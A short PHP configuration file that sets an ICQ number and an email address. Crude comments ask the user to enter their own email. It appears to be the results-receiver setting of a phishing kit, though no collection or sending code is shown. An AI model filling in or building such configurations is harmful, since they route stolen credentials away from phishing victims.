<?php
//MY ICQ LEAVE IT FREE :D
 $ICQ=670486322;
	
//ICQ670486322 
$email = "jazzpharma.com@gmail.com"; // PUT UR FUCKING E-MAIL BRO
//ICQ670486322

 
 
	
?>